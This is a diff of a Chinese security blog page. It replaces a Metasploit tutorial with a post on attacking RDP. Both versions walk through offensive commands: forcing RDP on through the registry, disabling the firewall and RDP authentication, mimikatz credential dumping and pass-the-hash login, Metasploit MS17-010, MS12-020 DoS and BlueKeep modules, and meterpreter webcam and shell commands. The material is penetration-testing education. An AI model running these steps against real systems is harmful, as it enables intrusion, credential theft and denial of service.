@@ -4,10 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="metasploit框架, f14g">
-    <meta name="description" content="简称MSF，高度模块儿化，框架由多个module组成。
-它是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。
-目录&amp;#x2F;usr&amp;#x2F;share&amp;#x2F;metasplo">
+    <meta name="keywords" content="RDP之渗透, f14g">
+    <meta name="description" content="RDP协议RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议T.120 的一个扩展。远程桌面协议让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>metasploit框架 | f14g</title>
+    <title>RDP之渗透 | f14g</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
 
@@ -273,12 +271,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/58.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">metasploit框架</h1>
+                    <h1 class="description center-align post-title">RDP之渗透</h1>
                 </div>
             </div>
         </div>
@@ -302,8 +300,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/metasploit/">
-                                <span class="chip bg-color">metasploit</span>
+                            <a href="/tags/RDP/">
+                                <span class="chip bg-color">RDP</span>
                             </a>
                         
                     </div>
@@ -314,8 +312,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/cs%E5%92%8Cmsf/" class="post-category">
-                                cs和msf
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
                             </a>
                         
                     </div>
@@ -327,28 +325,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-06-09
+                    2023-08-12
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-08-04
+                    2023-08-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    579
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    2 分
                 </div>
                 
 
@@ -371,136 +369,55 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>简称MSF，高度模块儿化，框架由多个module组成。</p>
-<p>它是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。</p>
-<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;share&#x2F;metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h2 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h2><p>RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议T.120 的一个扩展。远程桌面协议让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。大部分的 Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389 端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。</p>
+<h2 id="查看RDP是否开启"><a href="#查看RDP是否开启" class="headerlink" title="查看RDP是否开启"></a>查看RDP是否开启</h2><h3 id="查看是否开启"><a href="#查看是否开启" class="headerlink" title="查看是否开启"></a>查看是否开启</h3><p>查看注册表</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG QUERY <span class="token string">"HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server"</span> /v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">data:包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件
-documentation:包含框架可用的框架
-lib：metasploit的库文件夹
-plugins:用来存放metasploit的插件
-scripts:用来存放metasploit的脚本，包括meterpreter及其脚本
-tools:存放多种命令行实用程序
-modules:存储metasploit的模块文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>查看RDP服务的端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG QUERY <span class="token string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ WinStations\RDP-Tcp"</span> /v PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>modules目录</p>
-<pre class="line-numbers language-none"><code class="language-none">auxiliary：辅助模块，辅助渗透（端口扫描、登录密码爆破、漏洞验证）
-encoders ：编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统
-evasion ：躲避模块，用来生成免杀的payload
-exploits：漏洞模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。命名规则：操作系统&#x2F;各种应用协议分类
-nops：由于IDS&#x2F;IPS会检查数据包中国不规则的数据，在某些情况下，比如针对溢出攻击，某些特殊滑行字符串会因为被拦截而导致攻击失效
-payloads：攻击载荷，主要是攻击成功后在目标及其执行的代码，比如反弹shell的代码
-post：后渗透阶段模块，漏洞利用成功获得meterpreter之后，向目标发送的一些功能性指令，如：提权等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>查看进程</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tasklist /svc <span class="token operator">|</span> <span class="token function">find</span> <span class="token string">"TermService"</span>    <span class="token comment"># 找到对应服务进程的 PID </span>
+<span class="token function">netstat</span> <span class="token parameter variable">-ano</span> <span class="token operator">|</span> <span class="token function">find</span> <span class="token string">"3389"</span>    <span class="token comment"># 找到进程对应的端口号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="metasploit简单命令"><a href="#metasploit简单命令" class="headerlink" title="metasploit简单命令"></a>metasploit简单命令</h2><pre class="line-numbers language-metasploit" data-language="metasploit"><code class="language-metasploit">msfdb init:初始化数据库
-msfconsole:启动
-db_status:查看是否连接到数据库
-workspace:查看工作区
-workspace -h:查看帮助命令
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="强制开启RDP"><a href="#强制开启RDP" class="headerlink" title="强制开启RDP"></a>强制开启RDP</h3><p>修改注册表允许远程桌面连接</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">REG ADD HKLMSYSTEMCurrentControlSetControlTerminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="metasploit-信息收集"><a href="#metasploit-信息收集" class="headerlink" title="metasploit-信息收集"></a>metasploit-信息收集</h2><pre class="line-numbers language-none"><code class="language-none">db_nmap:nmap扫描
--PA：TCP ACK PING扫描
--PS: TCP SYN PING扫描
--PR: ARP扫描是nmap对目标进行一个arp ping扫描的过程，尤其是在内网的情况下。因为防火墙不会禁止ARP请求
-hosts:当前工作区的所有主机
+<p>如果目标开启了防火墙，还需要配置防火墙为允许远程桌面连接</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh advfirewall firewall <span class="token function">add</span> rule <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"Remote Desktop"</span> <span class="token assign-left variable">protocol</span><span class="token operator">=</span>TCP <span class="token assign-left variable">dir</span><span class="token operator">=</span>in <span class="token assign-left variable">localport</span><span class="token operator">=</span><span class="token number">3389</span> <span class="token assign-left variable">action</span><span class="token operator">=</span>allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
--T[0-5]：默认是T3,T4表示最大TCP扫描延迟位10ms
--sS:TCP SYN扫描
--sA:TCP ACK扫描
--sT：TCP扫描
--A ：打开操作系统探测和版本探测<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>或者直接关闭防火墙</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="利用模块进行扫描"><a href="#利用模块进行扫描" class="headerlink" title="利用模块进行扫描"></a>利用模块进行扫描</h2><pre class="line-numbers language-none"><code class="language-none">端口扫描
-use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;模式
-use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn 半开扫描
-以use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn 扫描为例
-可以通过使用
-search portscan 进行查看都有什么方式
-show options    查看都有什么选项
-set rhost ip地址
-set threads 设置线程
-使用run或者exploit进行跑<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="通过-Metasploit-模块启动RDP"><a href="#通过-Metasploit-模块启动RDP" class="headerlink" title="通过 Metasploit 模块启动RDP"></a>通过 Metasploit 模块启动RDP</h3><p>使用<code>metasploit</code>启动 首先要获取目标一个<code>session</code>，然后使用后渗透模块post&#x2F;windows&#x2F;manage&#x2F;enable_rdp 开启远程连接。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use post/windows/manage/enable_rdp
+<span class="token builtin class-name">set</span> session <span class="token number">1</span>
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="远程桌面的连接"><a href="#远程桌面的连接" class="headerlink" title="远程桌面的连接"></a>远程桌面的连接</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre class="line-numbers language-none"><code class="language-none">redesktop IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">搜索 mstsc
+但是有时候还是会报错
+关闭鉴权模式就可以正常连接了
+REG ADD <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v UserAuthentication /t REG_DWORD /d <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">c段扫描
-use auxiliary&#x2F;scanner&#x2F;discovery
-按TAB键显示都有什么选项
-常用的是arp_sweep
-use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep
+<h2 id="PTH-登录远程-RDP"><a href="#PTH-登录远程-RDP" class="headerlink" title="PTH 登录远程 RDP"></a>PTH 登录远程 RDP</h2><p>先检查是否开启RDP服务，如果没开启就给他开启</p>
+<p>然后在目标机器上mimikatz执行命令获取NTLM的哈希值</p>
+<pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-然后设置目标主机
-set rhosts 192.168.123.0&#x2F;24
-然后设置线程什么的
-run
-就可以扫C段了
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在我们的Windows攻击机上</p>
+<pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:127.0.0.1 &#x2F;ntlm:781fd284a63ba30ef7a09a68a3a96fe8 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<h2 id="RDP相关的漏洞"><a href="#RDP相关的漏洞" class="headerlink" title="RDP相关的漏洞"></a>RDP相关的漏洞</h2><h3 id="MS12-020"><a href="#MS12-020" class="headerlink" title="MS12-020"></a>MS12-020</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.93.20
+<span class="token builtin class-name">set</span> rport <span class="token number">3389</span>
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-<h2 id="msf常用命令"><a href="#msf常用命令" class="headerlink" title="msf常用命令"></a>msf常用命令</h2><pre class="line-numbers language-none"><code class="language-none">show exploits:查看所有可用的渗透攻击程序代码
-show auxiliary：查看所有可用的辅助攻击工具
-show options&#x2F;advanced：查看该模块的可用选项
-show targets：查看该模块适用的攻击目标类型
-search：根据关键字搜索某模块
-info：显示模块的详细内容
-use：使用某个模块
-back：回退
-set&#x2F;unset：设置&#x2F;禁止模块中的某个参数
-setg&#x2F;usetg：设置&#x2F;禁用适用于所有模块的全局参数      
-save：将当前的设置保存下来，以便下次启动MSF终端时仍可以使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
-
-
-
-<h2 id="msf攻击获取meterpreter"><a href="#msf攻击获取meterpreter" class="headerlink" title="msf攻击获取meterpreter"></a>msf攻击获取meterpreter</h2><p>ms17_010</p>
-<pre class="line-numbers language-none"><code class="language-none">search ms17_010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/image-20230517002626452.png" alt="image-20230517002626452"></p>
-<p>两个攻击模块两个检测模块</p>
-<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010
-然后
-show options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/image-20230517002935053.png" alt="image-20230517002935053"></p>
-<pre class="line-numbers language-none"><code class="language-none">设置目标机器的地址
-set rhosts ip地址（可以使用网段）
-
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>如果存在漏洞的话就可以利用攻击脚本</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec 
-
-设置目标IP地址
-set rhosts IP地址
-
-run
-然后就进去了
-meterpreter
-然后输入 ？ 回车  会显示操作命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">这里如果拿到的不是meterpreter那么可以进行转化
-background  进入后台
-sessions
-
-然后输入 sessions 1
-进行转换<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="meterpreter的利用"><a href="#meterpreter的利用" class="headerlink" title="meterpreter的利用"></a>meterpreter的利用</h2><pre class="line-numbers language-none"><code class="language-none">输入 ?  查看功能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>这里我随便写几个功能</p>
-<pre class="line-numbers language-none"><code class="language-none">screenshot   截屏
-webcam_list  查看摄像头
-webcam_snap  通过摄像头拍照
-webcam_stream 通过摄像头开启视频
-shell        可以进入目标机器的命令行
-execute -H -i -f cmd.exe
-upload       上传文件  upload &#x2F;exp.py C:\\exp.py
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h3><p>在msf里面利用 exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</p>
+<p>参考文章：</p>
+<p>里面还有更多详细的用法</p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/542935.html">https://cn-sec.com/archives/542935.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64973687/article/details/128230410">https://blog.csdn.net/qq_64973687/article/details/128230410</a></p>
 
                 
             </div>
@@ -527,7 +444,7 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/">http://example.com/2023/06/09/metasploit%E6%A1%86%E6%9E%B6/</a>
+                    <a href="http://example.com/2023/08/12/RDP%E4%B9%8B%E6%B8%97%E9%80%8F/">http://example.com/2023/08/12/RDP%E4%B9%8B%E6%B8%97%E9%80%8F/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -565,8 +482,8 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/metasploit/">
-                                    <span class="chip bg-color">metasploit</span>
+                                <a href="/tags/RDP/">
+                                    <span class="chip bg-color">RDP</span>
                                 </a>
                             
                         </div>
@@ -856,16 +773,17 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/06/09/msfvenom/">
+                <a href="/2023/08/12/RDP%E4%B9%8B%E6%B8%97%E9%80%8F/">
                     <div class="card-image">
                         
-                        <img src="/images/16.jpg" class="responsive-img" alt="msfvenom">
+                        <img src="/images/58.jpg" class="responsive-img" alt="RDP之渗透">
                         
-                        <span class="card-title">msfvenom</span>
+                        <span class="card-title">RDP之渗透</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -875,26 +793,27 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/cs%E5%92%8Cmsf/" class="post-category">
-                                    cs和msf
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/msfvenom/">
-                        <span class="chip bg-color">msfvenom</span>
+                    <a href="/tags/RDP/">
+                        <span class="chip bg-color">RDP</span>
                     </a>
                     
                 </div>
@@ -908,12 +827,12 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/06/09/2023%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/">
+                <a href="/2023/08/11/mimikatz/">
                     <div class="card-image">
                         
-                        <img src="/images/2.jpg" class="responsive-img" alt="2023陕西省网络安全技能大赛">
+                        <img src="/images/58.jpg" class="responsive-img" alt="mimikatz">
                         
-                        <span class="card-title">2023陕西省网络安全技能大赛</span>
+                        <span class="card-title">mimikatz</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -924,14 +843,14 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-11
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/match/" class="post-category">
-                                    match
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
                                 </a>
                             
                             
@@ -941,8 +860,8 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/2023%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/">
-                        <span class="chip bg-color">2023陕西省赛</span>
+                    <a href="/tags/mimikatz/">
+                        <span class="chip bg-color">mimikatz</span>
                     </a>
                     
                 </div>
@@ -1103,13 +1022,6 @@ upload       上传文件  upload &#x2F;exp.py C:\\exp.py
 
 </main>
 
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script>
-    MathJax.Hub.Config({
-        tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
-    });
-</script>
 
 
 
